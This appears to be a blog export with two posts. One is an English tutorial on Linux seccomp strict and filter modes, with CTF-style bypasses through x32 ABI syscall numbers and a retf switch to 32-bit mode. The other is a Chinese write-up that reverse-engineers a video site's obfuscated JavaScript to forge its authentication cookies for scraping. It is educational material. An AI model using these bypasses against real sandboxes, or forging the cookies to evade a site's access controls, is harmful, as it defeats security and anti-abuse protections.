<p><code>prctl</code> is a syscall that allow you manipulate various aspects of the calling thread or process. There are lot of option we can use. In the case of of seccomp, we only need to focus on <code>PR_GET_SECCOMP</code> and <code>PR_SET_SECCOMP</code></p>
<p>To get current seccomp mode, we can simply use <code>prctl(PR_GET_SECCOMP)</code> </p>
<p>To change current seccomp mode, we need to use <code>prctl(PR_SET_SECCOMP,mode,arg1...)</code> </p>
<p>Here is the example program using seccomp strict mode</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// https://man7.org/linux/man-pages/man2/seccomp.2.html</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// demo of strict mode, only allow read(), write(), sigreturn()</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> msg[] = <span class="string">&quot;hello world1!\n&quot;</span>;</span><br><span class="line">    write(<span class="number">0</span>,&amp;msg,<span class="number">14</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;current mode %d, change to strict mode now...\n&quot;</span>, prctl(PR_GET_SECCOMP));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// two way of using prctl</span></span><br><span class="line">    <span class="comment">// prctl(PR_SET_SECCOMP,SECCOMP_MODE_STRICT);</span></span><br><span class="line">    syscall(__NR_prctl,PR_SET_SECCOMP,SECCOMP_MODE_STRICT);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// printf only use write, so it works</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;seccomp change to mode strict\n&quot;</span>);</span><br><span class="line">    <span class="comment">// because prctl is a syscall. so no luck on that</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This line shouldn&#x27;t appear; current mode %d\n&quot;</span>, prctl(PR_GET_SECCOMP));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>Output:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">17:01:07 $ ./seccomp_strict </span><br><span class="line">hello world1!</span><br><span class="line">current mode 0, change to strict mode now...</span><br><span class="line">seccomp change to mode strict</span><br><span class="line">Killed</span><br></pre></td></tr></table></figure>

<p>As we can see, after we switch to strict mode, we can only use <code>read</code>, <code>write</code>, <code>exit</code>, <code>sigreturn</code>. If we try to use other syscall, such as <code>prctl</code>, the program would quit immediately.</p>
<h1 id="Seccomp-BPF-filter-mode"><a href="#Seccomp-BPF-filter-mode" class="headerlink" title="Seccomp BPF (filter mode)"></a>Seccomp BPF (filter mode)</h1><p>As we said, <em>filter mode</em> allow user use bpf filter and limit the usage of certain syscall. So before talking about seccomp, Lets talk about bpf first.</p>
<p>BPF was initially used in data link layer, allowing user to run code quickly inside kernel. So, user can manipulate witch data packets such filter data packet using bpf. Later bpf was also used in other places. </p>
<p>seccomp <em>filter mode</em> also use a bgf vritual machine for syscall filtering.</p>
<p>To do that, we need make a <em>small program</em> and load that program to kernel. <strong>Noted that loading process is invertible</strong>. So, once you loaded your bpf filter to the kernel, you will not able to modify or delete that.</p>
<p>a bpf program is defined by <code>sock_fprog</code>.  In this struct, there is a len field showing the total number of instructions and a pointer to a list of instructions.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct sock_fprog &#123;	/* Required for SO_ATTACH_FILTER. */</span><br><span class="line">	unsigned short		len;	/* Number of filter blocks */</span><br><span class="line">	struct sock_filter __user *filter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>each instruction is defined by <code>sock_filter</code>. We can use different instruction code to perform different operation. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct sock_filter &#123;	/* Filter block */</span><br><span class="line">	__u16	code;   /* Actual filter code */</span><br><span class="line">	__u8	jt;	/* Jump true */</span><br><span class="line">	__u8	jf;	/* Jump false */</span><br><span class="line">	__u32	k;      /* Generic multiuse field */</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>sock_fprog</code> and <code>sock_filter</code> are defined in <a href="https://github.com/torvalds/linux/blob/master/include/uapi/linux/filter.h">filter.h</a>. Detailed explanation be also be found in the header file.</p>
<p>bpf instruction include basic load, save, arithmetic op, jmp (condition&#x2F;uncondition), and return.</p>
<p>all these instructions can be found in <a href="https://github.com/torvalds/linux/blob/master/include/uapi/linux/bpf_common.h">bpf_common.h</a>.</p>
<p>When writing the bpf program, we can use two macro (<code>BPF_STMT</code> and <code>BPF_JUMP</code> to simplify our code.</p>
<p><a href="https://github.com/torvalds/linux/blob/master/include/uapi/linux/filter.h">filter.h</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#ifndef BPF_STMT</span><br><span class="line">#define BPF_STMT(code, k) &#123; (unsigned short)(code), 0, 0, k &#125;</span><br><span class="line">#endif</span><br><span class="line">#ifndef BPF_JUMP</span><br><span class="line">#define BPF_JUMP(code, k, jt, jf) &#123; (unsigned short)(code), jt, jf, k &#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>

<p><code>BPF_STMT</code> is used for manipulate register and return value. It has two parameter. the first parameter is bpf instruction and second parameter is the value.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// find load nr (syscall number) to internal register</span></span><br><span class="line">BPF_STMT(BPF_LD | BPF_W | BPF_ABS | BPF_K,(offsetof(<span class="keyword">struct</span> seccomp_data, nr)))</span><br></pre></td></tr></table></figure>

<p><code>BPF_LD</code> means load value from <code>seccomp_data</code>, <code>BPF_ABS</code> means use absolute offset for data. <code>BPF_K</code> means load value to that internal register. </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BPF_STMT(BPF_RET | BPF_K,SECCOMP_RET_KILL)</span><br></pre></td></tr></table></figure>

<p>This just means return kill and end the process</p>
<p><code>BPF_JUMP</code> is used for design control flow of our mini program. There are four arguments: instruction number, the value, jmp number if true, jump number is false</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K ,__NR_execve , 0, 2)</span><br></pre></td></tr></table></figure>

<p>This statement means if value in the internal register is equal to <code>__NR_execve</code>, it will skip next <code>jt=0</code> instruction (so doesn&#39;t do anything). if they are not equal, it will skip next <code>jf=2</code> instructions.</p>
<p>After we create struct for seccomp, we can load our program to kernel using <code>prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog)</code>.</p>
<p>One thing to mention is that we must set <code>PR_SET_NO_NEW_PRIVS</code> to 1, otherwise seccomp filter mode won&#39;t work <code>prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);</code></p>
<p>Lets look at an example which trying to print out the flag for us. </p>
<p><code>seccomp_filter.c</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// https://man7.org/linux/man-pages/man2/seccomp.2.html</span><br><span class="line">#include &lt;linux/seccomp.h&gt;  /* Definition of SECCOMP_* constants */</span><br><span class="line">#include &lt;linux/filter.h&gt;   /* Definition of struct sock_fprog */</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/prctl.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stddef.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line"></span><br><span class="line">// demo of filter mode, not allow open</span><br><span class="line">int main() &#123;</span><br><span class="line">    char msg[] = &quot;hello world1!\n&quot;;</span><br><span class="line">    write(0,&amp;msg,14);</span><br><span class="line">    printf(&quot;current mode %d, change to filter mode now...\n&quot;, prctl(PR_GET_SECCOMP));</span><br><span class="line"></span><br><span class="line">    // must set to PR_SET_NO_NEW_PRIVS to 1, otherwise SECCOMP_MODE_FILTER will fail.</span><br><span class="line">    // https://man7.org/linux/man-pages/man2/seccomp.2.html</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);</span><br><span class="line"></span><br><span class="line">    struct sock_filter filter[] = &#123;</span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W |BPF_ABS,(offsetof(struct seccomp_data, nr))), // get syscall number</span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K,__NR_open,0,2), // if equal, continue (jump 0 instruction, jump to kill), else jump 2 instructions (jump to allow)</span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K,SECCOMP_RET_KILL), // return kill</span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K,SECCOMP_RET_TRACE), // return trace</span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K,SECCOMP_RET_ALLOW), // return allow</span><br><span class="line">    &#125;;</span><br><span class="line">    // </span><br><span class="line">    struct sock_fprog prog = &#123;</span><br><span class="line">        .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),</span><br><span class="line">        .filter = filter,                                         </span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    printf(&quot;set mode return %d\n&quot;,prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog));</span><br><span class="line">    printf(&quot;seccomp change to mode filter\n&quot;);</span><br><span class="line"></span><br><span class="line">    // open should not work</span><br><span class="line">    int fd = syscall(__NR_open,&quot;flag.txt&quot;,O_RDONLY);</span><br><span class="line">    </span><br><span class="line">    // rest of the program wont execute</span><br><span class="line">    char flag[23];</span><br><span class="line">    read(fd,&amp;flag,23);</span><br><span class="line">    write(1,&amp;flag,23);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Output:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello world1!</span><br><span class="line">current mode 0, change to filter mode now...</span><br><span class="line">set mode return 0</span><br><span class="line">seccomp change to mode filter</span><br><span class="line">Bad system call</span><br></pre></td></tr></table></figure>

<p>We can see seccomp successfully stop <code>open</code> syscall from executing!</p>
<p>We can also validate our seccomp filter using a tool call <a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">17:06:17 $ seccomp-tools dump ./seccomp_filter</span><br><span class="line">hello world1!</span><br><span class="line">current mode 0, change to filter mode now...</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x00 0x02 0x00000002  if (A != open) goto 0004</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x7ff00000  return TRACE</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>


<h1 id="Common-strategies-in-CTF"><a href="#Common-strategies-in-CTF" class="headerlink" title="Common strategies in CTF"></a>Common strategies in CTF</h1><p>Now lets try to bypass our seccomp restriction.</p>
<h2 id="Seccomp-with-no-x32-ABI-check"><a href="#Seccomp-with-no-x32-ABI-check" class="headerlink" title="Seccomp with no x32 ABI check"></a>Seccomp with no x32 ABI check</h2><p>Here is our code from previous example. (see <code>seccomp_filter_no_x32_abi_check.c</code>)</p>
<p><img data-src="/images/ctf/a-brief-introduction-to-seccomp-and-how-to-bypass/2022-11-08_171915.jpg" alt="img"></p>
<p>Is there anyway we can bypass that? The answer is yes. Because we restricting <code>x64</code> syscall, <code>x32</code> syscalls are not limited!</p>
<p>We can still use x32 ABI syscalls</p>
<p>Therefore, if set x32 syscall flag bit for our syscall number, we can use our system call again!</p>
<p>We replace our syscall of open with <code>__NR_open|__X32_SYSCALL_BIT</code>.  </p>
<p><code>seccomp_filter_no_x32_abi_check_bypass.c</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl</span><br><span class="line">// only works for common syscalls</span><br><span class="line">// using x32 ABI to bypass :)</span><br><span class="line">// 0x2 | 0x40000000</span><br><span class="line">int fd = syscall(__NR_open|__X32_SYSCALL_BIT,&quot;flag.txt&quot;,O_RDONLY);</span><br><span class="line">printf(&quot;why open works????????????????\n&quot;);</span><br></pre></td></tr></table></figure>

<p>Execute our program again, we get the flag!</p>
<p><img data-src="/images/ctf/a-brief-introduction-to-seccomp-and-how-to-bypass/2022-11-08_174020.jpg" alt="get_flag"></p>
<h2 id="Seccomp-with-no-arch-check"><a href="#Seccomp-with-no-arch-check" class="headerlink" title="Seccomp with no arch check"></a>Seccomp with no arch check</h2><p>To prevent user from calling x32 ABI calls, we add another restriction. Check if syscall number is larger than <code>0x40000000</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BPF_JUMP(BPF_JMP | BPF_JGE| BPF_K,__X32_SYSCALL_BIT,1,0),</span><br></pre></td></tr></table></figure>

<p><code>seccomp_filter_no_arch_check.c</code><br><img data-src="/images/ctf/a-brief-introduction-to-seccomp-and-how-to-bypass/2022-11-08_174430.jpg" alt="img"></p>
<p>Output for seccomp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">17:48:35 $ seccomp-tools dump ./seccomp_filter_no_arch_check</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x35 0x01 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0003</span><br><span class="line"> 0002: 0x15 0x00 0x02 0x00000002  if (A != open) goto 0005</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x7ff00000  return TRACE</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>

<p>Now, previous method wont work because if our syscall number is larger than 0x40000000, program will return Kill and stop executing.</p>
<p>But, in this example, our rule doesn&#39;t check syscall for <code>i386</code> architecture. We can use <code>retf</code> and return to 32 bit. Then, we can use syscall from <code>i386</code>.</p>
<p>Here is the shellcode we can use to return to i386 code execution.</p>
<ol>
<li>xor return address with 0x2300000000 to return to 32 bit</li>
<li>push return address to the stack</li>
<li>use retf</li>
</ol>
<p><img data-src="/images/ctf/a-brief-introduction-to-seccomp-and-how-to-bypass/2022-11-08_175806.jpg" alt="get_flag_2"></p>
<p>full exploit can be found in <code>seccomp_filter_no_arch_check_bypass.c</code></p>
<p>Result</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">17:57:59 $ ./seccomp_filter_no_arch_check_bypass</span><br><span class="line">hello world1!</span><br><span class="line">current mode 0, change to filter mode now...</span><br><span class="line">set mode return 0</span><br><span class="line">seccomp change to mode filter</span><br><span class="line">now you can&#x27;t use open lol</span><br><span class="line">flag&#123;here_is_the_flag&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><p>TBD</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol>
<li><a href="https://en.wikipedia.org/wiki/Seccomp">https://en.wikipedia.org/wiki/Seccomp</a></li>
<li><a href="https://xz.aliyun.com/t/11480">https://xz.aliyun.com/t/11480</a></li>
<li><a href="https://n132.github.io/2022/07/04/S2.html">https://n132.github.io/2022/07/04/S2.html</a></li>
<li><a href="https://tripoloski1337.github.io/ctf/2021/07/12/bypassing-seccomp-prctl.html">https://tripoloski1337.github.io/ctf/2021/07/12/bypassing-seccomp-prctl.html</a></li>
<li><a href="http://blog.redrocket.club/2019/04/11/midnightsunctf-quals-2019-gissa2/">http://blog.redrocket.club/2019/04/11/midnightsunctf-quals-2019-gissa2/</a></li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>seccomp</tag>
      </tags>
  </entry>
  <entry>
    <title>agefans视频解析逆向</title>
    <url>/articles/ctf/agefans-shi-pin-jie-xi-ni-xiang/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在做爬虫项目，发现一个动漫网站挺好，可以这个视频解析似乎有加密，最近正好有空，看了一下这个解密是怎么做出来的</p>
<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>介绍一下今天的对象 <a href="https://www.agefans.cc/">agefans</a>。</p>
<p>那么首先开F12看看http有哪些请求。 然后这网站甚至还开了清console和不停debug来阻止我们使用开发者工具。</p>
<p><img data-src="/images/coding/agefans%E8%A7%86%E9%A2%91%E8%A7%A3%E6%9E%90%E9%80%86%E5%90%91/2021-10-14_084109.jpg" alt="2021-10-14_084109.jpg"><br><img data-src="/images/coding/agefans%E8%A7%86%E9%A2%91%E8%A7%A3%E6%9E%90%E9%80%86%E5%90%91/2021-10-14_084120.jpg" alt="2021-10-14_084120.jpg"></p>
<p>但是没有关系，把breakpoint关掉就行了。</p>
<p><img data-src="/images/coding/agefans%E8%A7%86%E9%A2%91%E8%A7%A3%E6%9E%90%E9%80%86%E5%90%91/2021-10-14_084200.png" alt="2021-10-14_084200.png"></p>
<h1 id="简单的分析"><a href="#简单的分析" class="headerlink" title="简单的分析"></a>简单的分析</h1><p>先搜索一下视频文件在哪里出现了，</p>
<p>可以发现视频地址是在 _getplay2 这个api中得到的，</p>
<p>进一步分析可以得到_getplayer2是通过_getplay 302 跳转的。</p>
<span id="more"></span>
<p><img data-src="/images/coding/agefans%E8%A7%86%E9%A2%91%E8%A7%A3%E6%9E%90%E9%80%86%E5%90%91/2021-10-12_143227.jpg" alt="2021-10-12_143227.jpg"></p>
<p>比如, <a href="https://www.agefans.cc/_getplay?aid=20210249&playindex=2&epindex=1">https://www.agefans.cc/_getplay?aid=20210249&amp;playindex=2&amp;epindex=1</a>, 会302跳转到 <a href="https://www.agefans.cc/_getplay2?kp=xxxxxxxxxxxxxx">https://www.agefans.cc/_getplay2?kp=xxxxxxxxxxxxxx</a> 最后获得视频地址。</p>
<p>但是，直接访问 <a href="https://www.agefans.cc/_getplay?aid=20210249&playindex=2&epindex=1">https://www.agefans.cc/_getplay?aid=20210249&amp;playindex=2&amp;epindex=1</a> 无法得到302跳转，反而会返回 err:timeout. 所以猜测有一个鉴权。</p>
<h1 id="仔细的分析"><a href="#仔细的分析" class="headerlink" title="仔细的分析"></a>仔细的分析</h1><p>搜索 _getplay?, 在 <code>s_playpre.js</code> 中发现了他的踪迹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function __cb_getplay_url()&#123;</span><br><span class="line">    //</span><br><span class="line">    const _url = window.location.href;</span><br><span class="line">    const _rand = Math.random();</span><br><span class="line">    var _getplay_url = (_url.replace(/.*\/play\/(\d&#123;8&#125;)-(\d+?)-(\d+?)\.html.*/, &#x27;/_getplay?aid=$1&amp;playindex=$2&amp;epindex=$3&#x27;) + &#x27;&amp;r=&#x27; + _rand);</span><br><span class="line">    //</span><br><span class="line">    var re_resl = _getplay_url.match(/[&amp;?]+epindex=(\d+)/);</span><br><span class="line">    const hf_epi = (&#x27;&#x27; + FEI2(re_resl[1]));</span><br><span class="line">    const t_epindex_ = &#x27;epindex=&#x27;;</span><br><span class="line">    _getplay_url = _getplay_url.replace(t_epindex_ + re_resl[1], t_epindex_ + hf_epi);</span><br><span class="line">    return _getplay_url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续看哪些地方调用了<code>__cb_getplay_url</code>, </p>
<p>找到发送请求的地方, </p>
<p>简单分析一下这个用来处理权限问题的函数应该为<code>getplay_pck()</code> 以及 <code>getplay_pck2()</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function __getset_play(_in_id, cb_getplay_url, cb_cnt)&#123;</span><br><span class="line">    //</span><br><span class="line">    const _url = window.location.href;</span><br><span class="line">    const _rand = Math.random();</span><br><span class="line">    const _getplay_url = cb_getplay_url();</span><br><span class="line">    if(dettchk())&#123;</span><br><span class="line">      $.get(_getplay_url, function(_in_data, _in_status)&#123;</span><br><span class="line">          if(&#x27;err:timeout&#x27; == _in_data)&#123;</span><br><span class="line">            if(cb_cnt &gt; 0)&#123;</span><br><span class="line">              __getplay_pck();</span><br><span class="line">              __getplay_pck2();</span><br><span class="line">              return __getset_play(_in_id, cb_getplay_url, cb_cnt-1);</span><br><span class="line">            &#125;else &#123;</span><br><span class="line">              return false;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          // ignored</span><br></pre></td></tr></table></figure>

<p>同理，搜索<code>getplay_pck()</code> 以及 <code>getplay_pck2()</code>, 发现他们分别出现在 <code>s_runtimelib.js</code> 和 <code>s_dett.js</code>中</p>
<p>但是这两个是加密的, 我们得对他们进行一波解密。</p>
<h1 id="特殊的分析"><a href="#特殊的分析" class="headerlink" title="特殊的分析"></a>特殊的分析</h1><p>在进行解密之前，我们先大概看一下服务器是如何鉴定正常的请求</p>
<p>如下是一个请求</p>
<p>在经过几次试验后，可以发现:</p>
<ul>
<li>这个请求可以正常获取到数据一定时间，过了一定时间后就会失效并且返回err:timeout.</li>
<li>除了referer之外, 要获取到正常数据，还需要cookie，可能是是<strong>t1,k2,k2,t2</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /_getplay?aid=20210249&amp;playindex=2&amp;epindex=1&amp;r=0.7315117942661356 HTTP/1.1</span><br><span class="line">Host: www.agefans.cc</span><br><span class="line">Connection: close</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;94&quot;, &quot;Google Chrome&quot;;v=&quot;94&quot;, &quot;;Not A Brand&quot;;v=&quot;99&quot;</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://www.agefans.cc/play/20210249?playid=2_1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: ck_volume=0.18; fa_c=1; Hm_lvt_7fdef555dc32f7d31fadd14999021b7b=1634075310,1634227432; Hm_lpvt_7fdef555dc32f7d31fadd14999021b7b=1634227432; t1=1634227492738; k1=372490656; k2=71052386557371; t2=1634227447871; fa_t=1634227447913</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>同时，失败的请求会返回 set-cookie, 如下</p>
<p>set-cookie设置了t1以及k1, </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 14 Oct 2021 16:07:43 GMT</span><br><span class="line">Content-Type: text/plain; charset=utf-8</span><br><span class="line">Content-Length: 11</span><br><span class="line">Connection: close</span><br><span class="line">Set-Cookie: t1=1634227713016; Path=/</span><br><span class="line">Set-Cookie: k1=382912592; Path=/</span><br><span class="line">X-XSS-Protection: 1; mode=block</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">Access-Control-Allow-Origin: https://web.age-spa.com:8443</span><br><span class="line">Access-Control-Allow-Methods: GET, POST, OPTIONS</span><br><span class="line">Access-Control-Allow-Headers: DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Cache-Control: no-store</span><br><span class="line">Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</span><br><span class="line">CF-Cache-Status: DYNAMIC</span><br><span class="line">Expect-CT: max-age=604800, report-uri=&quot;https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct&quot;</span><br><span class="line">Server: cloudflare</span><br><span class="line">CF-RAY: 69e20ff0ae286040-SEA</span><br><span class="line"></span><br><span class="line">err:timeout</span><br></pre></td></tr></table></figure>

<p><strong>所以，综合分析可以得知，首先我们需要获取<em>t1, k2</em>. 然后通过一定的算法，生成<em>t2,k2</em>并保存在cookie中，再次发送请求就可以获得数据了</strong></p>
<h1 id="加密的分析"><a href="#加密的分析" class="headerlink" title="加密的分析"></a>加密的分析</h1><p>先来看一下这两文件长什么样</p>
<p><img data-src="/images/coding/agefans%E8%A7%86%E9%A2%91%E8%A7%A3%E6%9E%90%E9%80%86%E5%90%91/2021-10-14_091306.jpg" alt="2021-10-14_091306.jpg"></p>
<p>简单分析后得知, 加密后的代码大概分为三个部分</p>
<ul>
<li>数据段，包括对数据进行进一步处理</li>
<li>解密函数</li>
<li>加密代码段</li>
</ul>
<p>那么要解密也很简单了，只要把加密的地方，例如_0x1705(&quot;xx&quot;,&quot;bbb&quot;)通过解密函数解密即可。</p>
<p>当然函数名是是还原不了了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function __getplay_pck2() &#123;</span><br><span class="line">;var encode_version = &#x27;加密类型版本&#x27;</span><br><span class="line">      , fwiba = &#x27;__0x9ecf8&#x27;</span><br><span class="line">      , __0x9ecf8 = [&#x27;数据&#x27;];</span><br><span class="line">     // 处理数据 </span><br><span class="line">    (function(_0x25c7a5, _0x422073) &#123;</span><br><span class="line">        var _0x25cb8a = function(_0x355576) &#123;</span><br><span class="line">            while (--_0x355576) &#123;</span><br><span class="line">                _0x25c7a5[&#x27;push&#x27;](_0x25c7a5[&#x27;shift&#x27;]());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        _0x25cb8a(++_0x422073);</span><br><span class="line">    &#125;(__0x9ecf8, 0x1db));</span><br><span class="line">    // 解密函数</span><br><span class="line">    var _0x1705 = function(_0x501411, _0x17d72d) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // 加密后的原始代码</span><br><span class="line">    xxx[_0x1705(xxx,xxx)] = xxx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>知道了解密方法之后我们来看一下用来做验证的两个函数到底干了什么</p>
<h2 id="getplay-pck"><a href="#getplay-pck" class="headerlink" title="getplay_pck()"></a>getplay_pck()</h2><p>首先是犯下首先之罪的 <code>__getplay_pck()</code>,</p>
<p>猜测一下<code>f</code>大概就是获得cookie的值，然后<code>f2</code>大概就是设置cookie的值。</p>
<p>如下图分析，这段算法首先获取了t1的值，然后把t1除 0x3e8 (1000) 四舍五入取整，最后右移5位</p>
<p>k2可通过一段不明意义的计算获取</p>
<p>t2为当前时间</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// get cookie t1 </span><br><span class="line">// t1 = Math.round(Number(f(&#x27;t1&#x27;)) / 0x3e8) &gt;&gt; 0x5;</span><br><span class="line">t1 = Math[&#x27;round&#x27;](Number(f(&#x27;t1&#x27;)) / 0x3e8) &gt;&gt; 0x5;</span><br><span class="line"></span><br><span class="line">// set cookie k2</span><br><span class="line">// k2 = (t1 * (t1 % 0x1000) * 0x3 + 0x1450f) * (t1 % 0x1000) + t1</span><br><span class="line">f2(&#x27;k2&#x27;, (t1 * (t1 % 0x1000) * 0x3 + 0x1450f) * (t1 % 0x1000) + t1);</span><br><span class="line"></span><br><span class="line">// set cookie t2</span><br><span class="line">// k2 =  new Date().getTime()+&quot;&quot;</span><br><span class="line">f2(&#x27;t2&#x27;, new Date()[_0x1705(&#x27;0x12&#x27;, &#x27;bPNz&#x27;)]());</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="getplay-pck2"><a href="#getplay-pck2" class="headerlink" title="getplay_pck2()"></a>getplay_pck2()</h2><p>然后是是犯下然后之罪的 <code>__getplay_pck2()</code></p>
<p>通过分析得知，首先获取k2的最后一个数字，然后获取一个t2，使这个t2的最后三个数字包含k2的最后一个数字</p>
<p>结束</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ksub = k2[-1]</span><br><span class="line">ksub = f(&#x27;k2&#x27;)[&#x27;slice&#x27;](-0x1);</span><br><span class="line">// while true</span><br><span class="line">while (!![]) &#123;</span><br><span class="line">	// t2 =  new Date().getTime()</span><br><span class="line">    t2 = new Date()[&#x27;getTime&#x27;]();</span><br><span class="line">    // if t2.toString().slice(-0x3).indexOf(ksub) &gt;= 0</span><br><span class="line">    if (t2[&#x27;toString&#x27;]()[&#x27;slice&#x27;](-0x3)[_0x1691(&#x27;0x12&#x27;, &#x27;9f@X&#x27;)](ksub) &gt;= 0x0) &#123;</span><br><span class="line">    	// set cookie t2 = t2</span><br><span class="line">        f2(&#x27;t2&#x27;, t2);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

